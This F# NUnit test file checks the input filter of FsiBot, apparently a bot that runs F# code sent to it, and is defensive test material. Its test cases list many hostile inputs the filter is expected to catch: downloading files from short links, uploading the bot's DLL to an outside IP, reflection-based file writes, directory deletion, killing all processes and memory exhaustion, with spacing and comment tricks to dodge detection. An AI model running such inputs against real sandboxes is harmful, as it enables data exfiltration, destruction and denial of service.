namespace FsiBot.Tests

open NUnit.Framework
open FsUnit
open FsiBot
open FsiBot.Filters
open FsiBot.SessionRunner

[<TestFixture>]
type ``Session tests`` () = 

    let sec = 1000

    [<Test>]
    member this.``Vanilla code`` () =
        let code = "42"
        runSession (5*sec) code |> should equal (EvaluationSuccess("42"))
    
    [<Test>]
    member this.``Timeout handling`` () =
        let code = "0 |> Seq.unfold (fun x -> Some(x,x+1)) |> Seq.toList"
        runSession (10*sec) code |> should equal EvaluationTimeout

type ``Filters tests`` () =

    [<TestCase("""@fsibot (http://System.Net    .WebClient()).DownloadFile("http://bit.ly/fugetmaster ","fuget.fsx")""", Result=true)>]
    [<TestCase("""@fsibot System. Net. WebClient().UploadFile("http://176.10.137.206:8086/", "fsibot.dll" """, Result=true)>]
    [<TestCase("""@fsibot System.AppDomain.CreateDomain "test" """, Result=true)>]
    [<TestCase("""@fsibot System.Reflection.Assembly.Load("mscorlib").GetType("System.I"+"O.File").GetMethod("WriteAllBytes").Invoke(1,[|"b";[|108uy|]|])""", Result=true)>]
    [<TestCase("""@fsibot System.Reflection.Assembly.Load("mscorlib").GetType("System.I"+"O.File").GetMethod("WriteAllBytes").Invoke(1,[|"b";[|108uy;101uy]|])""", Result=true)>]
    [<TestCase("""@fsibot System.Reflection.Assembly.Load("mscorlib").GetType("System.I"+"O.File").GetMethod("WriteAllBytes").Invoke(1,[|"b";[|108uy|]|])""", Result=true)>]
    [<TestCase("""@fsibot while true do System.Runtime.InteropServices.Marshal.AllocHGlobal(1024)""", Result=true)>]
    [<TestCase("""@fsibot System.Diagnostics.Process.Start(@"rm ..\..\..\..\..\Desktop\What.txt")""", Result=true)>]
    [<TestCase("""Console.WriteLine("aaa") //@fsibot""", Result=true)>]
    [<TestCase("""@fsibot System.Environment.GetCommandLineArgs()""", Result=true)>]
    [<TestCase("""@fsibot System.Diagnostics.Process.Start("notepad.exe")""", Result=true)>]
    [<TestCase("""@fsibot System.IO.File.ReadAllText(@"..\..\..\..\..\Desktop\What.txt")""", Result=true)>]
    [<TestCase("""@fsibot (http://System.Net .WebClient()).DownloadFile("http://bit.ly/1nO1RUi ","p.jpg")""", Result=true)>]
    [<TestCase("""@fsibot System.Environment.GetEnvironmentVariable("@AccountUsername")""", Result=true)>]
    [<TestCase("""@fsibot Microsoft.WindowsAzure.ServiceRuntime.RoleEnvironment.IsAvailable""", Result=true)>]
    [<TestCase("""@fsibot (http://System.Net.WebClient()).DownloadFile("http://bit.ly/1nO1RUi ","p.jpg")""", Result=true)>]
    [<TestCase("""@fsibot System.IO.File.ReadAllText("test.fsi")""", Result=true)>]
    [<TestCase("""@fsibot System.IO.File.WriteAllText("test.fsi", "sprintf \"%s\" \"hello\"")""", Result=true)>]
    [<TestCase("""@fsibot System.Diagnostics.Process.Start("fsi")""", Result=true)>]
    [<TestCase("""@fsibot http://System.IO.Directory .Delete(System.Environment.CurrentDirectory)""", Result=true)>]
    [<TestCase("""@fsibot System.Diagnostics.Process.Start("fsi")""", Result=true)>]
    [<TestCase("""@fsibot let p = System.Diagnostics.Process.GetCurrentProcess() in p.Kill()""", Result=true)>]
    [<TestCase("""@fsibot http://System.IO.Directory .Delete(System.Environment.CurrentDirectory)""", Result=true)>]
    [<TestCase("""@fsibot System.AppDomain.Unload(System.AppDomain.CurrentDomain)""", Result=true)>]
    [<TestCase("""@fsibot printf "%A" System.Environment.CurrentDirectory""", Result=true)>]
    [<TestCase("""@fsibot System.Threading.Thread.Sleep(-1)""", Result=true)>]
    [<TestCase("""@fsibot System.IO.File.WriteAllText(@"..\..\..\..\..\Desktop\What.txt","@rojepp: My bad")""", Result=true)>]
    [<TestCase("""@fsibot System.Diagnostics.Process.GetProcesses() |> Array.Parallel.iter (fun p -> p.Kill())""", Result=true)>]
    [<TestCase("""@fsibot System.Environment.Exit(0)""", Result=true)>]
    [<TestCase("""@fsibot System.Threading.Thread.CurrentThread.Abort()""", Result=true)>]
    member test.``Bad guys`` (code:string) =
        match code with
        | Danger _ -> true
        | _ -> false

type ``Full message tests`` () =

    let unsafe = [
//        """@fsibot http://System.IO.Directory .Delete(System.Environment.CurrentDirectory)"""
//        """@fsibot (http://System.Net    .WebClient()).DownloadFile("http://bit.ly/fugetmaster ","fuget.fsx")"""
//        """@fsibot (http://System.Net .WebClient()).DownloadFile("http://bit.ly/1nO1RUi ","p.jpg")"""
        """@fsibot (http://System.Net.WebClient()).DownloadFile("http://bit.ly/1nO1RUi ","p.jpg")"""
        """@fsibot http://System.IO.Directory .Delete(System.Environment.CurrentDirectory)"""
        """@fsibot System. Net. WebClient().UploadFile("http://176.10.137.206:8086/", "fsibot.dll" """
        """@fsibot System.AppDomain.CreateDomain "test" """
        """@fsibot System.Reflection.Assembly.Load("mscorlib").GetType("System.I"+"O.File").GetMethod("WriteAllBytes").Invoke(1,[|"b";[|108uy|]|])"""
        """@fsibot System.Reflection.Assembly.Load("mscorlib").GetType("System.I"+"O.File").GetMethod("WriteAllBytes").Invoke(1,[|"b";[|108uy;101uy]|])"""
        """@fsibot System.Reflection.Assembly.Load("mscorlib").GetType("System.I"+"O.File").GetMethod("WriteAllBytes").Invoke(1,[|"b";[|108uy|]|])"""
        """@fsibot while true do System.Runtime.InteropServices.Marshal.AllocHGlobal(1024)"""
        """@fsibot System.Diagnostics.Process.Start(@"rm ..\..\..\..\..\Desktop\What.txt")"""
        """Console.WriteLine("aaa") //@fsibot"""
        """@fsibot System.Environment.GetCommandLineArgs()"""
        """@fsibot System.Diagnostics.Process.Start("notepad.exe")"""
        """@fsibot System.IO.File.ReadAllText(@"..\..\..\..\..\Desktop\What.txt")"""
        """@fsibot System.Environment.GetEnvironmentVariable("@AccountUsername")"""
        """@fsibot Microsoft.WindowsAzure.ServiceRuntime.RoleEnvironment.IsAvailable"""
        """@fsibot System.IO.File.ReadAllText("test.fsi")"""
        """@fsibot System.IO.File.WriteAllText("test.fsi", "sprintf \"%s\" \"hello\"")"""
        """@fsibot System.Diagnostics.Process.Start("fsi")"""
        """@fsibot System.Diagnostics.Process.Start("fsi")"""
        """@fsibot let p = System.Diagnostics.Process.GetCurrentProcess() in p.Kill()"""
        """@fsibot System.AppDomain.Unload(System.AppDomain.CurrentDomain)"""
        """@fsibot printf "%A" System.Environment.CurrentDirectory"""
        """@fsibot System.Threading.Thread.Sleep(-1)"""
        """@fsibot System.IO.File.WriteAllText(@"..\..\..\..\..\Desktop\What.txt","@rojepp: My bad")"""
        """@fsibot System.Diagnostics.Process.GetProcesses() |> Array.Parallel.iter (fun p -> p.Kill())"""
        """@fsibot System.Environment.Exit(0)"""
        """@fsibot System.Threading.Thread.CurrentThread.Abort()""" 
        """@fsibot System. (**)Diagnostics. (**)Process.GetProcesses() |> Array.Parallel.iter (fun p -> p.Kill())"""
        """@fsibot System. Threading. (**)Thread.CurrentThread.Abort()""" ]

    [<Test>]
    member test.``Unsafe sample`` () =
        for case in unsafe do
            processMention case |> should equal UnsafeCode